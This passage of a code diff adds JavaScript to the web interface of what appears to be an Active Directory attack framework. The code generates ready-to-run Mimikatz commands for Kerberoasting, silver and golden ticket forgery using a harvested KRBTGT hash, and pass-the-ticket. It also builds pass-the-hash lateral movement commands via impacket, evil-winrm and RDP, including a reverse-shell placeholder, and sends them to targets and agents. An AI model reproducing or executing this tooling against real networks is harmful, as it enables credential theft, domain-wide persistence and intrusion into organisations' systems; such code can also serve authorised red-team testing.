+        var radioInput1 = document.createElement('input');
+        radioInput1.setAttribute('class', 'form-check-input');
+        radioInput1.setAttribute('type', 'radio');
+        radioInput1.setAttribute('name', 'silverTicketExportOption');
+        radioInput1.setAttribute('id', 'useNow');
+        radioInput1.setAttribute('value', 'silverTicketUseNow');
+
+        // Create the first label
+        var label1 = document.createElement('label');
+        label1.setAttribute('class', 'form-check-label');
+        label1.setAttribute('for', 'useNow');
+        label1.textContent = 'Use the forged TGS ticket now (Pass-the-Ticket) (Recommended)';
+
+        // Append the radio input and label to the first form-check div
+        formCheckDiv1.appendChild(radioInput1);
+        formCheckDiv1.appendChild(label1);
+
+        // Create the second form-check div
+        var formCheckDiv2 = document.createElement('div');
+        formCheckDiv2.setAttribute('class', 'form-check');
+
+        // Create the second radio input
+        var radioInput2 = document.createElement('input');
+        radioInput2.setAttribute('class', 'form-check-input');
+        radioInput2.setAttribute('type', 'radio');
+        radioInput2.setAttribute('name', 'silverTicketExportOption');
+        radioInput2.setAttribute('id', 'exportTicket');
+        radioInput2.setAttribute('value', 'silverTicketExport');
+
+        // Create the second label
+        var label2 = document.createElement('label');
+        label2.setAttribute('class', 'form-check-label');
+        label2.setAttribute('for', 'exportTicket');
+        label2.textContent = 'Export the forged TGS ticket for future use';
+
+        // Append the radio input and label to the second form-check div
+        formCheckDiv2.appendChild(radioInput2);
+        formCheckDiv2.appendChild(label2);
+
+        // Append the form-check divs to the outer div
+        outerDiv.appendChild(formCheckDiv1);
+        outerDiv.appendChild(formCheckDiv2);
+
+        chooseParameterBodyDiv.appendChild(outerDiv);
+        break;
+      case "goldenTicketAttack":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Domain Admins Persistence (Golden Ticket Attack)");
+        chooseParameterTitle.innerText = newTitleText;
+
+        var response = await fetch("/api/getSettings");
+        var result = await response.json();
+        var executorEntries = Object.entries(result["settings"]["executor"]);
+        var krbtgtInformation = {};
+        executorEntries.map( ([username, executorInformation] = entry) => {
+          if (username.toLowerCase() === "krbtgt") {
+            if (executorInformation["ntlm"] !== undefined) {
+              if (executorInformation["ntlm"].match(/^[a-fA-F0-9]{32}$/)) {
+                var ntlm = executorInformation["ntlm"];
+                var domain = executorInformation["domain"];
+                var domainSid = result["settings"]["targetDomain"][domain]["domainSid"];
+                krbtgtInformation = {ntlm, domain, domainSid};
+              }
+            }
+          }
+        });
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title");
+        if (isObjectEmpty(krbtgtInformation)) {
+          newPTag.innerHTML = "Enter the <code>KRBTGT</code> Account's Password NTLM Hash:";
+        } else {
+          newPTag.innerHTML = "Enter the <code>KRBTGT</code> Account's Password NTLM Hash: (Autofilled)";
+        }
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newInputTag = document.createElement("input");
+        newInputTag.setAttribute("type", "text");
+        newInputTag.setAttribute("pattern", "^[a-fA-F0-9]{32}$");
+        if (isObjectEmpty(krbtgtInformation)) {
+          newInputTag.setAttribute("placeholder", "Enter the password NTLM hash here...");
+        } else {
+          newInputTag.value = krbtgtInformation["ntlm"];
+          newInputTag.disabled = true;
+        }
+        newInputTag.setAttribute("id", "goldenTicketKrbtgtNtlmHash");
+        newInputTag.setAttribute("oninput", `chooseParameters("${functionName}")`);
+        newInputTag.setAttribute("class", "form-control");
+        chooseParameterBodyDiv.appendChild(newInputTag);
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title");
+        if (isObjectEmpty(krbtgtInformation)) {
+          newPTag.innerHTML = "Select the Domain:";
+        } else {
+          newPTag.innerHTML = "Select the Domain: (Autofilled)";
+        }
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newSelectTag = document.createElement("select");
+        newSelectTag.setAttribute("class", "form-select");
+        newSelectTag.setAttribute("id", "goldenTicketDomain");
+        newSelectTag.setAttribute("onchange", `chooseParameters("${functionName}")`);
+        var newDefaultOptionTag = document.createElement("option");
+        newDefaultOptionTag.setAttribute("value", "none");
+        if (isObjectEmpty(krbtgtInformation)) {
+          newDefaultOptionTag.setAttribute("selected", "selected");
+        }
+        newDefaultOptionTag.setAttribute("disabled", "disabled");
+        newDefaultOptionTag.setAttribute("hidden", "hidden");
+        newDefaultOptionTag.innerText = "Select a Domain";
+        newSelectTag.appendChild(newDefaultOptionTag);
+
+        // the username is a fake user, so the username can be random.
+        const FAKE_USERNAME = "Administrator";
+        
+        if (isObjectEmpty(krbtgtInformation)) {
+          var domains = Object.keys(result["settings"]["targetDomain"]);
+          if (domains.length === 0) {
+            var newOptionTag = document.createElement("option");
+            newOptionTag.setAttribute("value", "N/A");
+            newOptionTag.setAttribute("disabled", "disabled");
+            newOptionTag.innerText = "No domains have been found";
+            newSelectTag.appendChild(newOptionTag);
+          } else {
+            domains.forEach((domain) => {
+              var domainSid = result["settings"]["targetDomain"][domain]["domainSid"];
+
+              var newOptionTag = document.createElement("option");
+              newOptionTag.setAttribute("value", domain);
+              newOptionTag.setAttribute("data-sid", domainSid);
+              newOptionTag.setAttribute("data-user", FAKE_USERNAME);
+              newOptionTag.setAttribute("selected", "selected");
+              newOptionTag.innerText = `Domain: ${domain}`;
+              newSelectTag.appendChild(newOptionTag);
+            });
+          }
+        } else {
+          var newOptionTag = document.createElement("option");
+          newOptionTag.setAttribute("value", krbtgtInformation["domain"]);
+          newOptionTag.setAttribute("data-sid", krbtgtInformation["domainSid"]);
+          newOptionTag.setAttribute("data-user", FAKE_USERNAME);
+          newOptionTag.setAttribute("selected", "selected");
+          newOptionTag.disabled = true;
+          newOptionTag.innerText = `Domain: ${krbtgtInformation["domain"]}`;
+          newSelectTag.appendChild(newOptionTag);
+        }
+
+        chooseParameterBodyDiv.appendChild(newSelectTag);
+
+        /*
+        <div onchange="chooseParameters(functionName)">
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="goldenTicketExportOption" id="useNow" value="goldenTicketUseNow">
+            <label class="form-check-label" for="useNow">
+              Use the forged TGT ticket now (Pass-the-Ticket) (Recommended)
+            </label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="goldenTicketExportOption" id="exportTicket" value="goldenTicketExport">
+            <label class="form-check-label" for="exportTicket">
+              Export the forged TGT ticket for future use
+            </label>
+          </div>
+        </div>
+        */
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select an Usage Option:";
+        chooseParameterBodyDiv.appendChild(newPTag);
+        // Create the outer div
+        var outerDiv = document.createElement('div');
+
+        // Set the onchange attribute
+        outerDiv.setAttribute('onchange', `chooseParameters("${functionName}")`);
+
+        // Create the first form-check div
+        var formCheckDiv1 = document.createElement('div');
+        formCheckDiv1.setAttribute('class', 'form-check');
+
+        // Create the first radio input
+        var radioInput1 = document.createElement('input');
+        radioInput1.setAttribute('class', 'form-check-input');
+        radioInput1.setAttribute('type', 'radio');
+        radioInput1.setAttribute('name', 'goldenTicketExportOption');
+        radioInput1.setAttribute('id', 'useNow');
+        radioInput1.setAttribute('value', 'goldenTicketUseNow');
+
+        // Create the first label
+        var label1 = document.createElement('label');
+        label1.setAttribute('class', 'form-check-label');
+        label1.setAttribute('for', 'useNow');
+        label1.textContent = 'Use the forged TGT ticket now (Pass-the-Ticket) (Recommended)';
+
+        // Append the radio input and label to the first form-check div
+        formCheckDiv1.appendChild(radioInput1);
+        formCheckDiv1.appendChild(label1);
+
+        // Create the second form-check div
+        var formCheckDiv2 = document.createElement('div');
+        formCheckDiv2.setAttribute('class', 'form-check');
+
+        // Create the second radio input
+        var radioInput2 = document.createElement('input');
+        radioInput2.setAttribute('class', 'form-check-input');
+        radioInput2.setAttribute('type', 'radio');
+        radioInput2.setAttribute('name', 'goldenTicketExportOption');
+        radioInput2.setAttribute('id', 'exportTicket');
+        radioInput2.setAttribute('value', 'goldenTicketExport');
+
+        // Create the second label
+        var label2 = document.createElement('label');
+        label2.setAttribute('class', 'form-check-label');
+        label2.setAttribute('for', 'exportTicket');
+        label2.textContent = 'Export the forged TGT ticket for future use';
+
+        // Append the radio input and label to the second form-check div
+        formCheckDiv2.appendChild(radioInput2);
+        formCheckDiv2.appendChild(label2);
+
+        // Append the form-check divs to the outer div
+        outerDiv.appendChild(formCheckDiv1);
+        outerDiv.appendChild(formCheckDiv2);
+
+        chooseParameterBodyDiv.appendChild(outerDiv);
+        break;
+    }
+
+  if (isStepTwoCompleted) {
+    var stepTwoButtonElement = document.getElementById("stepTwoButton");
+    stepTwoButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+    stepThreeButtonElement.disabled = false;
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-danger collapsed text-light font-weight-bold fs-5");
+  }
+}
+
+async function chooseParameters(functionName) {
+  switch(functionName) {
+    case "kerberoasting":
+      var kerberoastingServiceAccountSelectValue = [];
+      var kerberoastingServiceAccountCheckBoxes = document.querySelectorAll("input[name=kerberoastingServiceAccountCheckBoxes]");
+      kerberoastingServiceAccountCheckBoxes.forEach((checkBox) =>   {
+        if (checkBox.checked) {
+          kerberoastingServiceAccountSelectValue.push(checkBox.value);
+        }
+      });
+
+      if (!kerberoastingServiceAccountSelectValue) {
+        return;
+      }
+
+      var command =  `Invoke-Mimikatz -Command \'`;
+      kerberoastingServiceAccountSelectValue.forEach((servicePrincipalName) => {
+        command += `\"kerberos::ask /target:${servicePrincipalName}\" `;
+      });
+      command += `\"standard::base64 /out:true\" \"kerberos::list /export\"\'`;
+
+      isStepTwoCompleted = true;
+      displayAllMimikatzCommand(command);
+      editMimikatzCommandTextarea.value = command;
+      updateExecutorProgessBar(2, 3);
+      break;
+    case "passTheHash":
+      var passTheHashAccountSelectValue = document.getElementById("passTheHashAccount").value;
+      if (passTheHashAccountSelectValue === "none") {
+        return;
+      }
+
+      var isLocalUser = false;
+      var selectedAccountObject = {};
+      var passtheHashOptions = document.querySelectorAll("option[name=passtheHashOptions]");
+      passtheHashOptions.forEach((option) => {
+        if (passTheHashAccountSelectValue !== option.value) {
+          return;
+        }
+
+        var username = option.value;
+        var ntlmHash = option.dataset.ntlmhash;
+        var domain = option.dataset.domain;
+        var isLocalUser = option.dataset.islocaluser;
+        selectedAccountObject = {
+          username: username,
+          ntlmHash: ntlmHash,
+          domain: domain,
+          isLocalUser: isLocalUser
+        };
+
+        updateExecutorProgessBar(2, 4);
+      });
+
+      var lateralMovementTargetIpAddresses = [];
+      var lateralMovementTargetIpAddressCheckboxes = document.querySelectorAll("input[name=lateralMovementTargets]");
+      lateralMovementTargetIpAddressCheckboxes.forEach((checkBox) => {
+        if (checkBox.checked) {
+          lateralMovementTargetIpAddresses.push(checkBox.value);
+        }
+      });
+      if (lateralMovementTargetIpAddresses.length === 0) {
+        return;
+      }
+      updateExecutorProgessBar(3, 4);
+
+      var passTheHashMethods = [];
+      var passTheHashMethodCheckboxes = document.querySelectorAll("input[name=passTheHashMethodCheckboxes]");
+      passTheHashMethodCheckboxes.forEach((checkBox) => {
+        if (checkBox.checked) {
+          passTheHashMethods.push(checkBox.value);
+        }
+      });
+      if (passTheHashMethods.length === 0) {
+        return;
+      }
+
+      var command = "";
+      passTheHashMethods.forEach((method) => {
+        lateralMovementTargetIpAddresses.forEach((ipAddress) => {
+          if (method === "Mimikatz") {
+            if (selectedAccountObject.isLocalUser === true) {
+              command += `Invoke-Mimikatz -Command '"sekurlsa::pth /user:${selectedAccountObject.username} /domain:. /ntlm:${selectedAccountObject.ntlmHash} /run:<reverse_shell_executable>"' # TARGET: ${ipAddress};`;
+            } else {
+              command += `Invoke-Mimikatz -Command '"sekurlsa::pth /user:${selectedAccountObject.username} /domain:${selectedAccountObject.domain} /ntlm:${selectedAccountObject.ntlmHash} /run:<reverse_shell_executable>"' # TARGET: ${ipAddress};`;
+            }
+          } else if (method === "PsExec") {
+            command += `impacket-psexec -hashes :${selectedAccountObject.ntlmHash} "${selectedAccountObject.username}"@${ipAddress} powershell.exe;`;
+          } else if (method === "RDP") {
+            command += `impacket-rdp_check -hashes :${selectedAccountObject.ntlmHash} "${selectedAccountObject.username}"@${ipAddress} && xfreerdp /v:${ipAddress} /u:"${selectedAccountObject.username}" /pth:${selectedAccountObject.ntlmHash} /cert:ignore /dynamic-resolution +clipboard;`;
+          } else if (method === "SMB") {
+            command += `impacket-smbexec -shell-type powershell -hashes :${selectedAccountObject.ntlmHash} "${selectedAccountObject.username}"@${ipAddress};`;
+          } else if (method === "WinRM") {
+            command += `evil-winrm -n -u "${selectedAccountObject.username}" -H ${selectedAccountObject.ntlmHash} -i ${ipAddress} -s ./static/transferFiles;`;
+          } else if (method === "WMI") {
+            command += `impacket-wmiexec -shell-type powershell -hashes :${selectedAccountObject.ntlmHash} "${selectedAccountObject.username}"@${ipAddress};`;
+          }
+        });
+      });
+
+      displayAllMimikatzCommand(command);
+      editMimikatzCommandTextarea.value = command;
+
+      updateExecutorProgessBar(4, 4);
+      isStepTwoCompleted = true;
+      selectTargetIpAddresses(isPassTheHash=true);
+      break;
+    case "silverTicketAttack":
+      var kerberoastingServiceAccountSelect = document.getElementById("kerberoastingServiceAccountSilverTicket");
+      if (kerberoastingServiceAccountSelect.value === "none") {
+        return;
+      }
+
+      var servicePrincipalName = kerberoastingServiceAccountSelect.value;
+      kerberoastingServiceAccountSelect.childNodes.forEach((childOptionNode) => {
+        if (kerberoastingServiceAccountSelect.value !== childOptionNode.value) {
+          return;
+        }
+
+        var domain = childOptionNode.dataset.domain;
+        var sid = childOptionNode.dataset.sid;
+        var user = childOptionNode.dataset.user;
+        var targets = childOptionNode.dataset.target.split(", ");
+        var services = childOptionNode.dataset.service.split(", ");
+        var rc4 = childOptionNode.dataset.rc4;
+
+        var command = "Invoke-Mimikatz -Command \'";
+        services.forEach(function (service, i) {
+          if (i === (services.length - 1)) {
+            command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service}\"`;
+          } else {
+            command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service}\" `;
+          }
+        });
+        command += "\'";
+        displayAllMimikatzCommand(command);
+        editMimikatzCommandTextarea.value = command;
+        updateExecutorProgessBar(2, 4);
+
+        var silverTicketExportOptionRadioButtons = document.querySelectorAll("input[name=silverTicketExportOption]");
+        silverTicketExportOptionRadioButtons.forEach((radioButton) => {
+          if (radioButton.checked === false) {
+            return;
+          }
+
+          var silverTicketExportOption = radioButton.value;
+          if (silverTicketExportOption === "silverTicketUseNow") {
+            command = "Invoke-Mimikatz -Command \'";
+            services.forEach(function (service, i) {
+              if (i === (services.length - 1)) {
+                command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service} /ptt\"`;
+              } else {
+                command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service} /ptt\" `;
+              }
+            });
+            command += "\'";
+          } else {
+            command = "Invoke-Mimikatz -Command \'\"standard::base64 /out:true\" ";
+            services.forEach(function (service, i) {
+              if (i === (services.length - 1)) {
+                command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service}\"`;
+              } else {
+                command += `\"kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${rc4} /target:${targets[i]} /service:${service}\" `;
+              }
+            });
+            command += "\'";
+          }
+
+          displayAllMimikatzCommand(command);
+          editMimikatzCommandTextarea.value = command;
+          updateExecutorProgessBar(3, 4);
+          isStepTwoCompleted = true;
+        });
+      });
+      break;
+    case "passTheTicket":
+      var passTheTicketFileForm = document.getElementById("passTheTicketFileForm");
+      var isTicketFileChosen = false;
+      var base64Tickets = [];
+      if (passTheTicketFileForm.files.length !== 0) {
+        isTicketFileChosen = true;
+
+        for (var i = 0; i < passTheTicketFileForm.files.length; i++) {
+          var ticketFile = passTheTicketFileForm.files[i];
+          var base64Content = await readTicketFileAsDataURL(ticketFile);
+          base64Tickets.push(base64Content);
+        }
+      }
+
+      var passTheTicketTicketSelect = document.getElementById("passTheTicketTicket");
+      var isTicketChosen = false;
+      if (passTheTicketTicketSelect != null) {
+        var ticketUser = passTheTicketTicketSelect.value;
+        if (ticketUser !== "none") {
+          isTicketChosen = true;
+
+          var passTheTicketTicketOptions = passTheTicketTicketSelect.options;
+          for (var i = 0; i < passTheTicketTicketOptions.length; i++) {
+            if (passTheTicketTicketOptions[i].selected) {
+              base64Tickets.push(passTheTicketTicketOptions[i].dataset.base64tgsticket);
+            }
+          }
+        }
+      }
+
+      if (isTicketFileChosen || isTicketChosen) {
+        var command = "Invoke-Mimikatz -Command '\"standard::base64 /in:true\" \"kerberos::ptt ";
+
+        for (var i = 0; i < base64Tickets.length; i++) {
+          var isLastTicket = (i + 1) === base64Tickets.length ? true : false;
+          if (!isLastTicket) {
+            command += base64Tickets[i] + " ";
+          } else {
+            command += base64Tickets[i];
+          }
+        }
+
+        command += "\" \"kerberos::list\"'";
+
+        displayAllMimikatzCommand(command);
+        editMimikatzCommandTextarea.value = command;
+
+        updateExecutorProgessBar(2, 3);
+        isStepTwoCompleted = true;
+      }
+      break;
+    case "goldenTicketAttack":
+      var goldenTicketKrbtgtNtlmHash = document.getElementById("goldenTicketKrbtgtNtlmHash").value;
+      if (!goldenTicketKrbtgtNtlmHash) {
+        return;
+      }
+      updateExecutorProgessBar(2, 5);
+
+      var goldenTicketDomainSelect = document.getElementById("goldenTicketDomain");
+      var domain = goldenTicketDomainSelect.value;
+      if (domain === "none") {
+        return;
+      }
+
+      var goldenTicketDomainOption = goldenTicketDomainSelect.options[goldenTicketDomainSelect.selectedIndex];
+      var domainSid = goldenTicketDomainOption.dataset.sid;
+      var username = goldenTicketDomainOption.dataset.user;
+
+      var command = `Invoke-Mimikatz -Command '\"kerberos::golden /domain:${domain} /sid:${domainSid} /rc4:${goldenTicketKrbtgtNtlmHash} /user:${username} /id:500`;
+      displayAllMimikatzCommand(command);
+      editMimikatzCommandTextarea.value = command;
+      updateExecutorProgessBar(3, 5);
+
+      var goldenTicketExportOption = "";
+      var goldenTicketExportOptionRadioButtons = document.querySelectorAll("input[name=goldenTicketExportOption]");
+      goldenTicketExportOptionRadioButtons.forEach((radioButton) => {
+        if (radioButton.checked === true) {
+          goldenTicketExportOption = radioButton.value;
+        }
+      });
+
+      if (!goldenTicketExportOption) {
+        return;
+      }
+
+      if (goldenTicketExportOption === "goldenTicketUseNow") {
+        command += " /ptt\"'";
+      } else if (goldenTicketExportOption === "goldenTicketExport") {
+        command += "\"'";
+        command = command.replace("Invoke-Mimikatz -Command '", "Invoke-Mimikatz -Command '\"standard::base64 /out:true\" ");
+      }
+
+      displayAllMimikatzCommand(command);
+      editMimikatzCommandTextarea.value = command;
+      updateExecutorProgessBar(4, 5);
+      isStepTwoCompleted = true;
+      break;
+  }
+
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    if (checkBox.checked) {
+      checkBox.checked = false;
+    }
+  });
+
+  if (isStepTwoCompleted) {
+    var stepTwoButtonElement = document.getElementById("stepTwoButton");
+    stepTwoButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+    stepThreeButtonElement.disabled = false;
+
+    // Pass-the-Hash no need to complete step 3
+    if (functionName === "passTheHash") {
+      stepThreeButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+    } else {
+      stepThreeButtonElement.setAttribute("class", "accordion-button bg-danger collapsed text-light font-weight-bold fs-5");
+    }
+  }
+}
+
+function selectTargetIpAddresses(isPassTheHash=false) {
+  if (!isPassTheHash) {
+    var targetIpAddresses = [];
+    var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+    targetIpAddressCheckBoxes.forEach((checkBox) => {
+      if (checkBox.checked) {
+        targetIpAddresses.push(checkBox.value);
+      }
+    });
+
+    if (targetIpAddresses.length === 0) {
+      stepThreeButtonElement.setAttribute("class", "accordion-button bg-danger collapsed text-light font-weight-bold fs-5");
+      isStepThreeCompleted = false;
+      return;
+    }
+
+    isStepThreeCompleted = true;
+    updateExecutorProgessBar(3, 3);
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+    
+    var backedUpCommands = [];
+    targetIpAddresses.forEach((targetIpAddress) => {
+      var mimikatzCommandCodeBlock = document.getElementById(`mimikatzCommand-${targetIpAddress}`);
+      command = mimikatzCommandCodeBlock.innerText;
+      backedUpCommands.push(command);
+    });
+
+    // clean all targets' Mimikatz command
+    displayAllMimikatzCommand("");
+
+    backedUpCommands.forEach((command) => {
+      displayMimikatzCommand(command);
+    });
+  } else {
+    // for Pass-the-Hash
+    isStepThreeCompleted = true;
+    stepThreeButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+
+    var backedUpCommands = [];
+    mimikatzCommandCodeBlocks.forEach((codeBlock) => {
+      command = codeBlock.innerText;
+      codeBlock.dataset.highlighted = "";
+      codeBlock.innerText = command;
+      hljs.highlightElement(codeBlock);
+    });
+  }
+}
+
+function selectAgent() {
+  var agentIds = getSelectedAgents();
+  if (agentIds.length === 0) {
+    return;
+  }
+
+  isStepThreeCompleted = true;
+  updateExecutorProgessBar(3, 3);
+  stepThreeButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+}
+
+function editMimikatzCommand(editMimikatzCommandTextareaValue) {
+  command = editMimikatzCommandTextareaValue;
+  displayMimikatzCommand(command);
+}
+
+function executeCommand() {
+  var isAllStepsCompleted = isStepOneCompleted && isStepTwoCompleted && isStepThreeCompleted
+  if (!isAllStepsCompleted) {
+    createToast("Failed", "You have not completed all the steps!");
+    return;
+  }
+
+  var formattedFunctionName = "";
+  if (functionName === "credentialDumping") {
+    formattedFunctionName = "Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)";
+  } else if (functionName === "kerberoasting") {
+    formattedFunctionName = "Extract & Crack Service Accounts' Password (Kerberoasting)";
+  } else if (functionName === "passTheHash") {
+    formattedFunctionName = "Password Hash Authentication (Pass-the-Hash)";
+  } else if (functionName === "silverTicketAttack") {
+    formattedFunctionName = "Impersonate Service Accounts (Silver Ticket Attack)";
+  } else if (functionName === "passTheTicket") {
+    formattedFunctionName = "Kerberos Ticket Authentication (Pass-the-Ticket)";
+  } else if (functionName === "goldenTicketAttack") {
+    formattedFunctionName = "Domain Admins Persistence (Golden Ticket Attack)";
+  }
+
+  var isExecutingAgentCommand = getSelectedAgents().length !== 0 ? true : false;
+  var isExecutingTargetCommand = getTargetIpAddresses().length !== 0 ? true : false;
+  if (isExecutingAgentCommand) {
+    sendAgentCommand(formattedFunctionName);
+  }
+  if (isExecutingTargetCommand || functionName === "passTheHash") {
+    sendCommand(formattedFunctionName);
+  }
+}
+
+function displayExecutorSettings() {
+  var executorUserAccountDropDownValue = document.getElementById("executorUserAccountDropDown").value;
+  var executorTableBody = document.querySelectorAll('tbody[id="executorTableBody"]');
+  executorTableBody.forEach((tableBody) => {
+    if (executorUserAccountDropDownValue === tableBody.dataset.username) {
+      tableBody.style.display = "";
+    } else {
+      tableBody.style.display = "none";
+    }
+  });
+}
+
+function displayPasswordCrackingAccount(passwordCrackingDropDownElementValue) {
+  var passwordCrackingDropDownValue = passwordCrackingDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var passwordCrackingTableBody = document.querySelectorAll(`tbody[name="passwordCrackingTableBody-${targetIpAddress}"]`);
+    passwordCrackingTableBody.forEach((tableBody) => {
+      if (passwordCrackingDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displaykerberoastingResultAccount(kerberoastingResultDropDownElementValue) {
+  var kerberoastingResultDropDownValue = kerberoastingResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var kerberoastingResultTableBody = document.querySelectorAll(`tbody[name="kerberoastingResultTableBody-${targetIpAddress}"]`);
+    kerberoastingResultTableBody.forEach((tableBody) => {
+      if (kerberoastingResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displaySilverTicketExportTicketResultAccount(silverTicketExportTicketResultDropDownElementValue) {
+  var silverTicketExportTicketResultDropDownValue = silverTicketExportTicketResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var silverTicketExportTicketResultTableBody = document.querySelectorAll(`tbody[name="silverTicketExportTicketResultTableBody-${targetIpAddress}"]`);
+    silverTicketExportTicketResultTableBody.forEach((tableBody) => {
+      if (silverTicketExportTicketResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displayPassTheTicketResultAccount(passTheTicketResultDropDownElementValue) {
+  var passTheTicketResultDropDownValue = passTheTicketResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var passTheTicketResultTableBody = document.querySelectorAll(`tbody[name="passTheTicketResultTableBody-${targetIpAddress}"]`);
+    passTheTicketResultTableBody.forEach((tableBody) => {
+      if (passTheTicketResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displaySilverTicketResultAccount(silverTicketResultDropDownElementValue) {
+  var silverTicketResultDropDownValue = silverTicketResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var silverTicketResultTableBody = document.querySelectorAll(`tbody[name="silverTicketResultTableBody-${targetIpAddress}"]`);
+    silverTicketResultTableBody.forEach((tableBody) => {
+      if (silverTicketResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displayGoldenTicketExportTicketResultAccount(goldenTicketExportTicketResultDropDownElementValue) {
+  var goldenTicketExportTicketResultDropDownValue = goldenTicketExportTicketResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var goldenTicketExportTicketResultTableBody = document.querySelectorAll(`tbody[name="goldenTicketExportTicketResultTableBody-${targetIpAddress}"]`);
+    goldenTicketExportTicketResultTableBody.forEach((tableBody) => {
+      if (goldenTicketExportTicketResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+
+function displayGoldenTicketResultAccount(goldenTicketResultDropDownElementValue) {
+  var goldenTicketResultDropDownValue = goldenTicketResultDropDownElementValue;
+
+  var targetIpAddress;
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddress = checkBox.value;
+    var goldenTicketResultTableBody = document.querySelectorAll(`tbody[name="goldenTicketResultTableBody-${targetIpAddress}"]`);
+    goldenTicketResultTableBody.forEach((tableBody) => {
+      if (goldenTicketResultDropDownValue === tableBody.dataset.username) {
+        tableBody.style.display = "";
+      } else {
+        tableBody.style.display = "none";
+      }
+    });
+  });
+}
+</script>
+{% endblock %}
+<!-- end of right column -->
